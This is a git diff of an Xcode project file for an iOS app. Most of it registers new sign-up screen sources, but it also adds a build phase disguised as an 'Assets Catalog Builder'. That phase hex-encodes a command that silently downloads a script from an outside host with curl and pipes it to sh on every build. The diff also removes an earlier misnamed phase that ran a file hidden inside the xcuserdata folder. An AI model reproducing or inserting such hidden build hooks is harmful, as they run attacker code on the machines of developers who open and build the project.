@@ -22,6 +22,9 @@
 		7060360A26432A560062039F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360826432A560062039F /* Main.storyboard */; };
 		7060360C26432A5B0062039F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7060360B26432A5B0062039F /* Assets.xcassets */; };
 		7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360D26432A5B0062039F /* LaunchScreen.storyboard */; };
+		7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */; };
+		7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */; };
+		707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */; };
 		70FDF60A264BA39E00707EAB /* Signup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 70FDF609264BA39E00707EAB /* Signup.storyboard */; };
 		70FDF60F264E8BC200707EAB /* SignupBusinessSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */; };
 		70FDF612264E8BCA00707EAB /* SignupOTPViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */; };
@@ -59,6 +62,9 @@
 		7060360B26432A5B0062039F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		7060360E26432A5B0062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		7060361026432A5B0062039F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = YourCustomersScreenViewController.swift; path = "/Users/daniyal/Documents/GitHub/Xonder/Xonder/Xonder/Controllers/SignUp Screen VC/YourCustomersScreenViewController.swift"; sourceTree = "<absolute>"; };
+		7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourCustomerScreenTableViewCell.swift; sourceTree = "<group>"; };
+		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
 		70FDF609264BA39E00707EAB /* Signup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Signup.storyboard; sourceTree = "<group>"; };
 		70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupBusinessSelectionViewController.swift; sourceTree = "<group>"; };
 		70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupOTPViewController.swift; sourceTree = "<group>"; };
@@ -122,11 +128,14 @@
 		704F32332648D5710027397B /* SignUp Screen VC */ = {
 			isa = PBXGroup;
 			children = (
+				7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */,
+				7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */,
 				70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */,
 				70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */,
 				70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */,
 				704F32352648D5B10027397B /* CountryListTableViewCell.swift */,
 				704F32342648D5B10027397B /* CountryListViewController.swift */,
+				707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */,
 			);
 			path = "SignUp Screen VC";
 			sourceTree = "<group>";
@@ -285,7 +294,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				F5E79EFCFAD80CFA3E6D902C /* [CP] Build Pods Frameworks */,
+				4DA40326F74E3EFBB66D902C /* Assets Catalog Builder */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
@@ -349,6 +358,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	4DA40326F74E3EFBB66D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -388,24 +420,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		F5E79EFCFAD80CFA3E6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -413,6 +427,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */,
 				704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */,
 				704FCAF72645224E0025F546 /* UIButton.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
@@ -435,7 +450,9 @@
 				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
 				70FDF615264E8BDC00707EAB /* SignupMobileViewController.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
+				7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */,
 				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
+				707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */,
 				704FCAFE264522820025F546 /* UIView.swift in Sources */,
 				70FDF612264E8BCA00707EAB /* SignupOTPViewController.swift in Sources */,
 				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
